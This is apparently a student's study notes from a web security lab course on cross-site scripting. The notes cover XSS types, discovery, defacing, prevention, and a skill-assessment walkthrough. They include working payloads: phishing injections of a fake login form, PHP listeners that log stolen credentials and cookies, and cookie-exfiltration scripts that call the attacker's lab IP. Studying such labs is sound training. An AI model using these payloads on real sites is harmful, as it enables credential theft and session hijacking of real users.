#CWES #XSS #Cross-site-scripting #OWASP10


#### General:
- XSS vulnerabilities found on the client side, and do not effect backend server, unless it is a stored XSS vulnerability.  
- Typical: low impact + high probability = medium risk type of vulnerability. 
- Modern web pages use Cross-domain IFrames to handle user input, this affects the way XXS works?


**Typical XSS cases:**
- Attacker gets target to send them their session cookie
- Attacker gets target browser to execute API to preform malicious actions, ex. changing their password. 
- Only persistent XSS vulnerabilities effect other users then the target. 

Case study: https://en.wikipedia.org/wiki/Samy_(computer_worm) 

**Types of XSS:**
![[Pasted image 20260113143329.png]]


#### Stored XSS:
- If we find a XSS vulnerability, we can check if it is persistent by refreshing the site and see if we get the "alert or XSS poc" again. 
- Common payloads to check for XSS: 
```
<script>alert(something)</script>
<script>print</script>
<plaintext>Everything after here should be rendered as plaintext.

```


#### Reflected XSS:
- Non persistent, but processed on the back-end server.
- Give aways / hints of XSS:  Our input gets returned to us in its entirety, ex. error or confirmation messages  

**How to exploit a non-persistent XSS to attack a target:**
- Depends on the HTTP request type 
- If GET request: Can send a link to target, where we set the get parameter to the payload. 
```
http://83.136.251.105:46543/index.php?task=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E
```

#### DOM-based XSS:
- DOM = Document object model
- Example: We make an input to the site, it makes no http requests, but it changes the content of the site - it changes the DOM. 
- Non persistent, processes only by on the client side

**JS function to change DOM**
- `document.write()`
- `DOM.innerHTML`
- `DOM.outerHTML`
  
**jQuery to change DOM:**
- `add()`
- `after()`
- `append()`

If "DOM-manipulator" functions are used and input is not being sanitized, then there is a good chance of DOM-XSS. 

- Any DOM-manipulators do not allow `<script>` tags, so we have to use other types of payloads. 
- Example:
```html
<img src="" onerror=alert(window.origin)>
```


#### Discovery:
- IDEA: Automated scanners identify input fields, then send a set of XSS payloads to it, and then check the result. 
- IDEA: Manually testing different payloads, example from here: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md - is slow and can take a while, consider automating with python. 
- IDEA: Code review, if we have access to the code of the site, we can see how the code handles user input. 

- Automated XSS tool: https://github.com/s0md3v/XSStrike.git

#### Exploitation of XSS:

**Defacing:**
- If we have a stored XSS vulnerability, then we can inject code that changes the look of the page.
Example:
```html
<script>document.body.style.background = "#141d2b"</script>


<script>document.body.background = "https://path-to-my-awsome-pic.img"</script>



<script>document.title = 'You have been pwned lmao'</script>
```


**Phishing:** 
- Can change the look of the page via XSS, either via stored or reflected 
- Can then send the manipulated page to the target, and get them to send sensitive stuff. 

The POC payload:
```
http://10.129.234.166/phishing/?url='>123<!--

http://10.129.234.166/phishing/?url='><script>alert("hello")</script><!--
```

Editing the page:
```html
http://10.129.82.88/phishing/?url='><script>document.write('<h3>Please login to continue</h3><form action=http://10.10.14.157><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');</script><!--
```

Final link with the payload sent to the target for phishing:
```html
http://10.129.82.88/phishing?url='><script>document.write('<h3>Please login to continue</h3><form action=http://10.10.14.157><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--
```

**BUT! The above is not a valid url, for example spaces cannot be used in a url!** 
- **So we have to url encode the parameter:**
- **NB: DO NOT URL ENCODE THE PROTOCOL, HOST OR THE DIRECTORY, ONLY THE PARAMETER PAYLOAD.**  
```html
http://10.129.82.88/phishing?url=%27%3E%3Cscript%3Edocument.write%28%27%3Ch3%3EPlease%20login%20to%20continue%3C%2Fh3%3E%3Cform%20action%3Dhttp%3A%2F%2F10.10.14.157%3E%3Cinput%20type%3D%22username%22%20name%3D%22username%22%20placeholder%3D%22Username%22%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%20placeholder%3D%22Password%22%3E%3Cinput%20type%3D%22submit%22%20name%3D%22submit%22%20value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3Bdocument.getElementById%28%27urlform%27%29.remove%28%29%3B%3C%2Fscript%3E%3C%21--
```

Readable solution: 
```html
http://10.129.82.88/phishing?url='><script>document.write('<h3>Please+login+to+continue</h3><form+action=http://10.10.14.157><input+type="username"+name="username"+placeholder="Username"><input+type="password"+name="password"+placeholder="Password"><input+type="submit"+name="submit"+value="Login"></form>');document.getElementById('urlform').remove();</script><!--

```

Then we can add a listening server that saves the username and password parameter, and redirects the user to the normal-non edited site:
- This makes the phishing more realistic. 

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://10.129.234.166/phishing/index.php");
    fclose($file);
    exit();
}
?>
```
run it with : `sudo php -S 0.0.0.0:80`


**Session Hijacking:**


Blind XSS payloads:
```html
"><script src=http://10.10.14.157/fullname.js></script>
"><script src=http://10.10.14.157/username.js></script>
"><script src=http://10.10.14.157/url.js></script>
```

```shell
┌──(venv)─(kali㉿kali)-[/tmp/tmpserver]
└─$ ls 
creds.txt  fullname.js  url.js  username.js

┌──(venv)─(kali㉿kali)-[/tmp/tmpserver]
└─$ sudo php -S 0.0.0.0:80
[Sat Jan 17 15:24:18 2026] PHP 8.4.16 Development Server (http://0.0.0.0:80) started
[Sat Jan 17 15:24:58 2026] 10.129.82.84:40758 Accepted
[Sat Jan 17 15:24:58 2026] 10.129.82.84:40758 [200]: GET /url.js
[Sat Jan 17 15:24:58 2026] 10.129.82.84:40758 Closing
```

- We want check what input field is vulnerable, so we setup a server with  different files 
- The file that gets a callback, is related to the field with the vulnerability. 
- We see the url field has a blind xss vuln. 

Then we can make a payload which steals the cookie of a admin user:
```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

So we can write this in the input field:
```html
"><script>new Image().src='http://10.10.14.157/index.php?c='+document.cookie;</script>
```

or save the js code in a file on our server and do:
```html
"><script src=http://10.10.14.157/script.js></script>
```

- Then save this as script.js
- And send in the payload: `"><script src=http://10.10.14.157/script.js></script>`
- Which does a callback to our php server - which saves the cookies:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```


#### Preventing XSS:
**Frontend:**
- https://github.com/cure53/DOMPurify 

No user input directly into html tags such as:
1. JavaScript code `<script></script>`
2. CSS Style Code `<style></style>`
3. Tag/Attribute Fields `<div name='INPUT'></div>`
4. HTML Comments `<!-- -->`

Avoid js  functions that allow changing raw text of html fields like:
- `DOM.innerHTML`
- `DOM.outerHTML`
- `document.write()`
- `document.writeln()`
- `document.domain`

And the following jQuery functions:
- `html()`
- `parseHTML()`
- `add()`
- `append()`
- `prepend()`
- `after()`
- `insertAfter()`
- `before()`
- `insertBefore()`
- `replaceAll()`
- `replaceWith()`

The above writes raw text to html code. 

**Backend**

Input validation and sanitization 
Should never display direct user input on the site 

Server config: 
- HTTPS over http
- XSS prevention headers
- Appropritate Content-Type
- Context-Security-Policy: script-src 'self'
- httpOnly and secure cookie flags -> Prevents js from reading cookies and only allows transports of cookies over HTTPS.
- Web Application Firewall 


#### Skill assessment:

Again we find multiple input fields, we try manually to inject script tags calling different scripts:
```html
<script src=http://10.10.15.70/user.js></script>
...

"<script src=http://10.10.15.70/website.js></script> 
```

```shell
┌──(venv)─(kali㉿kali)-[/tmp/tmpserver]
└─$ ls
comment.js  scripts.js  user.js  website.js
                                                                                  
┌──(venv)─(kali㉿kali)-[/tmp/tmpserver]
└─$ sudo php -S 0.0.0.0:80
[Wed Jan 21 19:48:07 2026] PHP 8.4.16 Development Server (http://0.0.0.0:80) started
[Wed Jan 21 19:48:23 2026] 10.129.234.166:55136 Accepted
[Wed Jan 21 19:48:23 2026] 10.129.234.166:55136 [200]: GET /website.js
[Wed Jan 21 19:48:23 2026] 10.129.234.166:55136 Closing
```

- So the website fields is vulnerable 
- We setup a default php listening server as earlier, and inject the code under into the website field:
```html
"<script>new Image().src='http://10.10.14.75/index.php?c='+document.cookie;</script>
```

Can also make a script.js file with this code, and fetch it from the input field:
```js
new Image().src='http://10.10.14.75/index.php?c='+document.cookie;
```

Then inject into the website field:
```
"<script src="http://10.10.14.75:80/script.js"></script>
```

- Finally the cookie in the admins browser gets sent to our php server as the parameter c:
![[Pasted image 20260130160044.png]]

